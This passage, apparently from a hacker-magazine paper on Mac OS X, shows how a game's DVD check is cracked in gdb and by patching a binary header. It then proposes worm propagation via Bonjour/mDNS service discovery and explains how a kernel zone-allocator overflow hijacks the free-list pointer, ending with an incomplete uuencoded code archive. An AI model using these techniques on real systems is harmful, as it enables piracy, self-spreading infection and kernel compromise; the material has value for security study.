+constructor, without testing for the DVD.
+
+
+Breakpoint 4, 0x028cc8db in dyld_stub_log10f ()
+(gdb) ret
+Make selected stack frame return now? (y or n) y
+#0  0x8fe0fcc4 in  _dyld__ZN16ImageLoaderMachO16doInitialization... ()
+And then continue execution.
+
+(gdb) c
+
+The error message was gone and Prey started up as if the DVD 
+was in the drive, SUCCESS! After playing the game for about 10
+minutes and running through the same boring corridor over and 
+over again I decided it was more fun to continue cracking the
+game than to actually play it. I exited the game and returned 
+to my shell.
+
+In order to modify the binary I used the HT Editor. [15] 
+Before I could use HTE to modify this file however, I had to
+extract the appropriate architecture for my system from the
+Universal binary. I accomplished this using the ditto command
+as follows.
+
+-[nemo@fry:/Prey/Prey.app/Contents/MacOS]$ ditto -arch i386 Prey Prey.i386
+-[nemo@fry:/Prey/Prey.app/Contents/MacOS]$ cp Prey Prey.backup
+-[nemo@fry:/Applications/Prey/Prey.app/Contents/MacOS]$ cp Prey.i386 Prey
+
+I then loaded the file in HTE. I pressed F6 to select the mode
+and chose the Mach-O/header option. I then scrolled down to
+find the __mod_init_func section. This is shown as follows:
+
+**** section 3 ****                                              
+section name                                      __mod_init_func         
+segment name                                      __DATA                  
+virtual address                                   00515cec                
+virtual size                                      00000380                
+file offset                                       00514cec                
+alignment                                         00000002                
+relocation file offset                            00000000                
+number of relocation entries                      00000000                
+flags                                             00000009                
+reserved1                                         00000000                
+reserved2                                         00000000              
+
+In order to skip the first constructor I simply added four
+bytes to the virtual address field, and subtracted four 
+bytes from the size. I did this by pressing F4 in HTE and 
+typing the values. Here is the new values:
+
+**** section 3 ****                                             
+section name                                      __mod_init_func         
+segment name                                      __DATA                  
+virtual address                                   00515cf0 <== += 4     
+virtual size                                      0000037c <== -= 4     
+file offset                                       00514cec                
+alignment                                         00000002                
+relocation file offset                            00000000                
+number of relocation entries                      00000000                
+flags                                             00000009                
+reserved1                                         00000000                
+reserved2                                         00000000               
+
+I then saved this new binary and executed it, again Prey
+started up fine without mentioning the missing DVD.
+
+Finally I repeated this process for the PowerPC binary
+and packed the two back together into a Universal binary
+using the lipo command.
+
+--[ 9 - Passive malware propagation with mDNS
+
+As I'm sure all of you are aware, the only reason for the 
+lack of malware on Mac OS X is due to the lack of market
+share (And therefore lack of people caring). 
+
+In this section I propose a way to remedy this. This method
+utilizes one of the default services which ships on Mac OS X
+10.4 at the time of writing: mDNSResponder. 
+
+The mDNSResponder service is an implementation of the 
+multicast DNS protocol. This protocol is documented
+thoroughly by several of the documents linked from [17].
+Also if you're interested in the protocol it makes sense
+to read the RFC [18].
+
+At a packet level the multicast DNS protocol is very similar
+to regular DNS. It also serves a similar (yet different) 
+purpose: mDNS is used to create a way for hosts on a LAN
+to automagically configure their network settings and begin
+communication without a DHCP server on the network. It is 
+also designed to allow the services on a network to be 
+browsable.
+
+Recently, mDNS implementations have been shipping for a large
+variety of operating systems, including Mac OS X, Vista, Linux
+and a variety of hardware devices such as printers. The mDNS
+implementation which is packaged with Mac OS X is called 
+Bonjour.
+
+Bonjour contains a useful API for registering and browsing
+services advertised by mDNS. The daemon mDNSResponder is
+responsible for all the network communication via a mach port
+named "com.apple.mDNSResponder" that is made available to the 
+system for communication with the daemon. The documentation
+for the API which is used to manipulate this daemon is found 
+at [19]. 
+
+The command line tool /usr/bin/mdns also exists for manipulating 
+the mDNSResponder daemon directly [20].  This tool has the following 
+functionality:
+
+-[nemo@fry:~]$ mdns
+mdns -E                  (Enumerate recommended registration domains)
+mdns -F                      (Enumerate recommended browsing domains)
+mdns -B        <Type> <Domain>        (Browse for services instances)
+mdns -L <Name> <Type> <Domain>           (Look up a service instance)
+mdns -R <Name> <Type> <Domain> <Port> [<TXT>...] (Register a service)
+mdns -A                      (Test Adding/Updating/Deleting a record)
+mdns -U                                  (Test updating a TXT record)
+mdns -N                             (Test adding a large NULL record)
+mdns -T                            (Test creating a large TXT record)
+mdns -M      (Test creating a registration with multiple TXT records)
+mdns -I   (Test registering and then immediately updating TXT record)
+
+Here is an example demonstrating using this tool to look for SSH 
+instances:
+
+-[nemo@fry:~]$ mdns -B _ssh._tcp. 
+Browsing for _ssh._tcp.local
+Talking to DNS SD Daemon at Mach port 3843
+Timestamp     A/R Flags Domain              Service Type     Instance Name
+11:16:45.816  Add     1 local.              _ssh._tcp.               fry
+
+As you can see, this functionality would be very useful for 
+malware installed on a new host. 
+
+Once a worm has compromised a new host, it must then scan for
+new targets to attack. This scanning is one of the most common
+ways for a worm to be detected on a network. In the case of 
+Mac OS X, where a large amount of scanning would be required to
+find a single target, this will more likely be the case. 
+
+We can use the Bonjour API to wait silently for a service to 
+advertise itself to our code, then infect the target as 
+necessary. This will greatly reduce the network traffic 
+required for worm propogation.
+
+The header file which contains the definition for the structs
+and functions needed is /usr/include/dns_sd.h. The functions
+needed are contained within libSystem and are therefor linked with
+almost every binary on the system. This is good news if you have
+just infected a new process and wish to perform the mDNS lookup
+from inside it's address space.
+
+The Bonjour API allows us to register a service, enumerate 
+domains as well as many other useful things. I will only 
+focus on browsing for an instance of a particular type of 
+service in this paper, however. This is a relatively 
+straight forward process. 
+
+The first function needed to find an instance of a service is the
+DNSServiceBrowse() function (shown below).
+
+DNSServiceErrorType DNSServiceBrowse ( 
+    DNSServiceRef *sdRef, 
+    DNSServiceFlags flags, 
+    uint32_t interfaceIndex, 
+    const char *regtype, 
+    const char *domain, /* may be NULL */
+    DNSServiceBrowseReply callBack, 
+    void *context /* may be NULL */
+);  
+
+The arguments to this are fairly straight forward. We simply 
+pass an uninitialized DNSServiceRef pointer, followed by an
+unused flags argument. The interfaceIndex specifies the 
+interface on which to perform the query. Setting this to 0 
+results on this query broadcasting on all interfaces. The
+ regtype field is used to specify the type of service we wish
+to browse for. In our example we will search for ssh. So the 
+string "_ssh._tcp" is used to specify ssh over tcp. Next the
+domain argument is used to specify the logical domain we wish 
+to browse. If this argument is NULL, the default domains are 
+used. Finally a callback must be supplied in order to indicate
+what to do once an instance is found. This function can include
+our infection/propagation code. 
+
+Once the call to DNSServiceBrowse() has been made, the function
+DNSServiceProcessResult() must be used to begin processing.
+
+This function simply takes the sdRef, initialized from the 
+first call to DNSServiceBrowse(), and calls the callback 
+function when results are received. It will block until 
+finding an instance. 
+
+Once a service is found, it must be resolved to an IP address
+and port so it can be infected.
+
+To do this the DNSServiceResolve() function can be used.
+This function is very similar to the DNSServiceBrowse()
+function, however a DNSServiceResolveReply() callback
+is used. Also the name of the service must already be
+known. The function prototype is as follows;
+
+	DNSServiceErrorType DNSServiceResolve ( 
+	    DNSServiceRef *sdRef, 
+	    DNSServiceFlags flags, 
+	    uint32_t interfaceIndex, 
+	    const char *name, 
+	    const char *regtype, 
+	    const char *domain, 
+	    DNSServiceResolveReply callBack, 
+	    void *context /* may be NULL */
+	);  
+
+The callback for this function receives the following
+arguments:
+
+	DNSServiceResolveReply resolve_target(
+	    DNSServiceRef sdRef,
+	    DNSServiceFlags flags,
+	    uint32_t interfaceIndex,
+	    DNSServiceErrorType errorCode,
+	    const char *fullname,
+	    const char *hosttarget,
+	    uint16_t port,
+	    uint16_t txtLen,
+	    const char *txtRecord,
+	    void *context
+	);
+
+Once again we must call the DNSServiceProcessResult() 
+function, passing the sdRef received from DNSServiceResolve
+to begin processing. 
+
+Once within the callback, the port which the service runs
+on is passed in as a short in network byte order. 
+
+Retrieving the IP address is simply a case of calling
+gethostbyname() on the hosttarget argument.
+
+I have included some code in the Appendix (discover.c)
+which demonstrates this clearly. This code can sit in a
+loop to enumerate each of the services and infect them.
+
+Opensshd warez not included. ;-)
+
+--[ 10 - Kernel Zone Allocator exploitation
+
+A zone allocator is a memory allocator which is designed 
+for efficient allocation of objects of identical size. 
+
+In this section I will look at how the mach zone allocator,
+(the zone allocator used by the XNU kernel) works. Then I 
+will look at how an overflow into the pages used by the zone 
+allocator can be exploited.
+
+The source for the mach zone allocator is located in the file 
+xnu/osfmk/kern/zalloc.c. 
+
+Some of objects in the XNU kernel which use the mach zone 
+allocator for allocation are; The task structs, the thread 
+structs, the pipe structs and the zone structs themselves.
+
+A list of the current zones on the system can be retrieved 
+from userspace using the host_zone_info() function. Mac OS X
+ships with a tool which takes advantage of this:
+
+	/usr/bin/zprint
+
+This tool displays each of the zones and their element size,
+current size, max size etc. Here is some sample output from
+running this program.
+
+elem    cur    max    cur    max   cur alloc alloc
+zone name                size   size   size  #elts  #elts inuse  size count
+---------------------------------------------------------------------------
+zones                    80    11K    12K    152    153    95    4K    51  
+vm.objects              136  3609K  3888K  27180  29274 21116    4K    30 C
+vm.object.hash.entries   20   374K   512K  19176  26214 17674    4K   204 C
+...
+tasks                   432    59K   432K    141   1024   113   20K    47 C
+threads                 868   329K  2172K    389   2562   295   56K    66 C
+...
+uthreads                296   114K   740K    396   2560   296   16K    55 C
+alarms                   44     3K     4K     93     93     2    4K    93 C
+load_file_server         36    56K   492K   1605  13994  1605    4K   113  
+mbuf                    256     0K  1024K      0   4096     0    4K    16 C
+socket                  344    38K  1024K    114   3048    75   20K    59 C
+
+It also gives you a chance to see some of the different types
+of objects which utilize the zone allocator.
+
+Before I demonstrate how to exploit an overflow into these
+zones, we will first look at how the zone allocator functions.
+
+When the kernel wishes to start allocating objects within a zone
+the zinit() function is first called. This function is used to
+allocate the zone which will contain each member of that 
+specific object type. The information about the newly created
+zone needs a place to stay. The "struct zone" struct is used to
+accommodate this information. The definition of this struct is 
+shown below.
+
+struct zone {
+        int             count;          /* Number of elements used now */
+        vm_offset_t     free_elements;
+        decl_mutex_data(,lock)          /* generic lock */
+        vm_size_t       cur_size;       /* current memory utilization */
+        vm_size_t       max_size;       /* how large can this zone grow */
+        vm_size_t       elem_size;      /* size of an element */
+        vm_size_t       alloc_size;     /* size used for more memory */
+        unsigned int
+        /* boolean_t */ exhaustible :1, /* (F) merely return if empty? */
+     /* boolean_t */ collectable :1, /* (F) garbage collect empty pages */
+     /* boolean_t */ expandable :1,  /* (T) expand zone (with message)? */
+        /* boolean_t */ allows_foreign :1,/* (F) allow non-zalloc space */
+        /* boolean_t */ doing_alloc :1, /* is zone expanding now? */
+   /* boolean_t */ waiting :1,     /* is thread waiting for expansion? */
+/* boolean_t */ async_pending :1,   /* asynchronous allocation pending? */
+        /* boolean_t */ doing_gc :1;    /* garbage collect in progress? */
+        struct zone *   next_zone;      /* Link for all-zones list */
+        call_entry_data_t       call_async_alloc;  
+	/* callout for asynchronous alloc */
+        const char      *zone_name;     /* a name for the zone */
+#if     ZONE_DEBUG
+        queue_head_t    active_zones;   /* active elements */
+#endif  /* ZONE_DEBUG */
+};
+
+The first thing that the zinit() function does is check if there is
+an existing zone in which to store the new zone struct. The 
+global pointer "zone_zone" is used for this. If the mach zone
+allocator has not yet been used, the zget_space() function is
+used to allocate more space for the zones zone (zone_zone).
+
+The code which performs this check is as follows:
+
+        if (zone_zone == ZONE_NULL) {
+                if (zget_space(sizeof(struct zone), (vm_offset_t *)&z)
+                    != KERN_SUCCESS)
+                        return(ZONE_NULL);
+        } else
+                z = (zone_t) zalloc(zone_zone);
+
+If the zone_zone exists, the zalloc() function is used to 
+retrieve an element from the zone. Each of the attributes
+of this new zone is then populated.
+
+        z->free_elements = 0;
+        z->cur_size = 0;
+        z->max_size = max;
+        z->elem_size = size;
+        z->alloc_size = alloc;
+        z->zone_name = name;
+        z->count = 0;
+        z->doing_alloc = FALSE;
+        z->doing_gc = FALSE;
+        z->exhaustible = FALSE;
+        z->collectable = TRUE;
+        z->allows_foreign = FALSE;
+        z->expandable  = TRUE;
+        z->waiting = FALSE;
+        z->async_pending = FALSE;
+
+As you can see, The free_elements linked list is 
+initialized to 0. The zone_init() function returns
+a zone_t pointer which is used for each allocation
+of new objects with zalloc(). Before returning 
+zinit() uses the zalloc_async() function to allocate
+and free a single element in the zone.
+
+Now that the zone is set up, the zalloc() and zfree()
+functions are used to allocate and free elements from 
+the zone. Also zget() is used to perform a non-blocking
+allocation from the zone.
+
+Firstly I will look at the zalloc() function. zalloc()
+is basically a wrapper function around the 
+zalloc_canblock() function. 
+
+The first thing zalloc_canblock() does is attempt to 
+remove an element from the zone's free_elements list
+and use it. The following macro (REMOVE_FROM_ZONE) is
+responsible for doing this.
+
+#define REMOVE_FROM_ZONE(zone, ret, type)                               \
+MACRO_BEGIN                                                             \
+        (ret) = (type) (zone)->free_elements;                           \
+        if ((ret) != (type) 0) {                                        \
+            if (!is_kernel_data_addr(((vm_offset_t *)(ret))[0])) {      \
+                panic("A freed zone element has been modified.\n");     \
+            }                                                           \
+            (zone)->count++;                                            \
+            (zone)->free_elements = *((vm_offset_t *)(ret));            \
+        }                                                               \
+MACRO_END
+#else   /* MACH_ASSERT */
+
+As you can see, this macro simply returns the 
+free_elements pointer from the zone struct. It
+also increments the count attribute and sets the 
+free_elements attribute of the zone struct to
+the "next" free element. It does this by 
+dereferencing the current free elements address.
+This shows that the first 4 bytes of an unused 
+allocation in a zone is used as a pointer to the
+next free element. This will come in handy to us 
+later. 
+
+The check is_kernel_data_addr() is used to make 
+sure we haven't tampered with the list. The 
+definition of this check is shown below:
+
+#define is_kernel_data_addr(a)                                          \
+  (!(a) || ((a) >= vm_min_kernel_address && !((a) & 0x3)))
+
+const vm_offset_t vm_min_kernel_address = VM_MIN_KERNEL_ADDRESS;
+#define VM_MIN_KERNEL_ADDRESS ((vm_offset_t) 0x00001000)
+
+As you can see this simply checks that the address is 
+not 0, it is greater or equal to 0x1000 (which isn't 
+a problem at all) and it's word aligned. This check does 
+not really cause any trouble when exploiting an overflow
+as you'll see later.
+
+If there are no free elements in the list the 
+doing_alloc attribute of the zone is checked.
+
+This attribute is used as a lock. If a blocking 
+allocation is performed the allocator will sleep until 
+this is unset. 
+
+Once it is ok to allocate an element the 
+kernel_memory_allocate() function is used to
+allocate one. The allocation is of a fixed
+size for the zone. The kernel_memory_allocate() 
+function is used at the base level of pretty 
+much all the memory allocators present in the
+XNU kernel. It basically just uses 
+vm_page_alloc() to allocate pages. Once the
+zone allocator successfully calls this function
+zcram() is used to break the pages up into elements
+and add them to the free_elements list. Each element 
+is added in the same way zfree() does so now that 
+I have looked at the allocation process I will take
+show the workings of zfree().
+ 
+The zfree() function is used to add an element back 
+to the zone free_elements list. The first thing zfree()
+does is to make sure that an element is not being zfree()'ed
+which was never zalloc()'ed. This is done using the 
+from_zone_map() macro. This macro is defined as follows.
+
+#define from_zone_map(addr, size) \
+        ((vm_offset_t)(addr) >= zone_map_min_address && \
+	         ((vm_offset_t)(addr) + size -1) <  zone_map_max_address)
+
+In the case of an overflow however, this check is not 
+particularly important so I will move on.
+
+Next the zfree() function (if zone debugging is enabled) will
+run through and check that the element did not come from
+a different zone to the one which has been passed to zfree().
+If this is the case a kernel panic() is thrown, alerting
+on what the problem was.
+
+Next zfree() runs through all the free_elements in the zones 
+list and calls the pmap_kernel_va() function. The code which 
+does this is as follows.
+
+     for (this = zone->free_elements;
+	     this != 0;
+	     this = * (vm_offset_t *) this)
+		if (!pmap_kernel_va(this) || this == elem)
+			panic("zfree");
+
+The pmap_kernel_va() check is shown below.
+
+#define VM_MIN_KERNEL_ADDRESS ((vm_offset_t) 0x00001000)
+#define pmap_kernel_va(VA)      \
+        (((VA) >= VM_MIN_KERNEL_ADDRESS) && ((VA) <= vm_last_addr))
+
+The pmap_kernel_va check simply checks that the address
+is greater than or equal to the VM_MIN_KERNEL_ADDRESS. 
+This address is defined (above) as 0x1000, the start of 
+the first page of valid kernel memory (straight after 
+PAGEZERO). It then checks if the address is less than 
+or equal to the vm_last_addr. This is defined as 
+VM_MAX_KERNEL_ADDRESS (shown below).
+
+vm_last_addr = VM_MAX_KERNEL_ADDRESS;   /* Set the highest address
+#define VM_MAX_KERNEL_ADDRESS        ((vm_offset_t) 0xFE7FFFFF)
+#define VM_MAX_KERNEL_ADDRESS ((vm_offset_t) 0xDFFFFFFF)
+
+Basically this means that anywhere within almost the entire
+address space of the kernel is valid.  
+
+Once these checks are performed, the final step zfree() does 
+is to use the ADD_TO_ZONE() macro in order to add the free'ed 
+element back to the free_elements list in the zone struct.
+
+Here is the macro used to do this:
+
+#define ADD_TO_ZONE(zone, element)                                      \
+MACRO_BEGIN                                                             \
+                if (zfree_clear)                                        \
+                {   unsigned int i;                                     \
+                    for (i=1;                                           \
+                         i < zone->elem_size/sizeof(vm_offset_t) - 1;   \
+                         i++)                                           \
+                    ((vm_offset_t *)(element))[i] = 0xdeadbeef;         \
+                }                                                       \
+                ((vm_offset_t *)(element))[0] = (zone)->free_elements;  \
+                (zone)->free_elements = (vm_offset_t) (element);        \
+                (zone)->count--;                                        \
+MACRO_END
+
+This macro runs through the memory allocated for the 
+element which is being free()'ed in 4 byte intervals.
+It writes out 0xdeadbeef to each location, filling
+the memory. and clearing any original data. It then
+writes into the first 4 bytes of the allocation, the
+old free_elements pointer, from the zone struct. 
+
+Now that I have shown briefly how the zone allocator 
+functions I will look at what happens in the case of an
+overflow.
+
+In the diagram below you can see an element in use
+followed by a free element. The first element 
+contains the data used by the struct (in this 
+sample case the struct is made up.)
+
+The second element consists of the pointer to the 
+free element followed by the unsigned long 
+0xdeadbeef repeated to fill the struct. Both the
+in use and free elements are the same size.
+
+low memory  (0x00000000)
+----( Element being overflowed )-----
+  00 00 00 01
+  22 22 22 22
+  33 33 33 33
+  00 00 00 00 
+  00 00 00 00 
+  00 00 00 00 
+  00 00 00 00 
+-----------( Free Element )----------
+[ ff fc 7c 7d ]	<== Pointer to next free element.
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+_____________________________________
+high memory (0xffffffff)
+
+In the case where a buffer within the first
+in use struct is overflown, (in this case with
+capital A [0x41])  it is then possible to overwrite
+the free elements "next" pointer. This is 
+demonstrated below.
+ 
+low memory  (0x00000000)
+----( Element being overflowed )-----
+  00 00 00 01
+  22 22 22 22
+  33 33 33 33
+  41 41 41 41 <== Overflow starts here
+  41 41 41 41 
+  41 41 41 41 
+  41 41 41 41 
+-----------( Free Element )----------
+[ 41 41 41 41 ]	<== Overflow into pointer.
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+  ef be ad de
+_____________________________________
+high memory (0xffffffff)
+
+In this case, when the REMOVE_FROM_ZONE() macro
+is used by zalloc() the user controlled address
+0x41414141 will become the zone struct's new 
+free_elements pointer, and consequently, be
+used by the next allocation of the element type.
+
+If this address is positioned correctly it may be
+possible to have something user controlled overwrite
+a useful pointer in kernel space and in this way gain
+control of execution. 
+
+Due to the checks performed on zfree() it is 
+recommended that efforts should be taken to avoid 
+this element being passed to zfree() however.
+As this will result in a kernel panic().
+
+--[ 11 - Conclusion
+ 
+Hopefully if you bothered to read this far you learned 
+something useful. If not, I apologize.
+
+If you take any of these ideas and work on them further
+or know of a better method to do anything covered in this
+paper I'd appreciate an email letting me know at:
+nemo@felinemenace.org. Flames to mercy@felinemenace.org 
+please ;)
+
+Now for the thanks. A huge thankyou to my amazing fiancee pif 
+for her love and support while i was writing this.
+Thanks to bk for all the help and long conversations about XNU. 
+Thanks to everyone at felinemenace for all the support, code 
+and fun times. Also a big thank you to my computer for not 
+kernel panic()'ing for a third time during the process of 
+saving this paper. I think if you had written random bytes 
+over the paper a third time I wouldn't have had the stamina 
+to rewrite (again).
+
+Finally, this paper isn't complete without another bad Star 
+Wars pun to match the title so here we go....
+
+May the fork()'s be with root...
+
+--[ 12 - References
+
+[1] b-r00t's Smashing the Mac for Fun & Profit
+	http://www.milw0rm.com/papers/44  
+[2] Smashing The Kernel Stack For Fun And Profit
+	http://www.phrack.org/archives/60/p60-0x06.txt 
+[3] Linux on-the-fly kernel patching without LKM
+	http://www.phrack.org/archives/58/p58-0x07
+[4] Mach-O Runtime 
+	http://developer.apple.com/documentation/DeveloperTools/ ...
+	Conceptual/MachORuntime/MachORuntime.pdf
+[5] Understanding windows shellcode
+	http://www.hick.org/code/skape/papers/win32-shellcode.pdf
+[6] Smashing The Kernel Stack For Fun And Profit
+	http://www.phrack.org/archives/60/p60-0x06.txt
+[7] Ilja's blackhat talk - 
+	http://www.blackhat.com/presentations/bh-europe-05/ ...
+	BH_EU_05-Klein_Sprundel.pdf
+[8] Mac OS X PPC Shellcode Tricks -
+	http://www.uninformed.org/?v=1&a=1&t=txt
+[9] Smashing the Stack for Fun and Profit - 
+	http://www.phrack.org/archives/49/P49-14
+[10] Radical Environmentalists by Netric -
+	http://packetstormsecurity.org/groups/netric/envpaper.pdf
+[11] Non eXecutable Stack Lovin on OSX86 -
+	http://www.digitalmunition.com/NonExecutableLovin.txt
+[12] Mach-O Infection -
+	http://felinemenace.org/~nemo/slides/mach-o_infection.ppt
+[13] Infecting Mach-O Fies
+	http://vx.netlux.org/lib/vrg01.html
+[14] class-dump
+	http://www.codethecode.com/Projects/class-dump/
+[15] HTE -
+	http://hte.sourceforge.net
+[16] Architecture Spanning Shellcode -
+	http://www.phrack.org/archives/57/p57-0x17
+[17] Multicast DNS -
+	http://www.multicastdns.org/
+[18] mDNS RFC	-
+	http://files.dns-sd.org/draft-cheshire-dnsext-nbp.txt
+[19] mDNS API - 
+	http://developer.apple.com/documentation/Networking/
+	Conceptual/dns_discovery_api/index.html
+[20] mdns command line utility -
+	http://developer.apple.com/documentation/Darwin/
+	Reference/Manpages/man1/mDNS.1.html
+[21] KUNC Reference -
+	http://developer.apple.com/documentation/DeviceDrivers/
+	Conceptual/WritingDeviceDriver/KernelUserNotification
+
+--[ 13 - Appendix - Code
+
+Extract this code with uudecode. 
+
+
+begin 644 code.tgz
+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
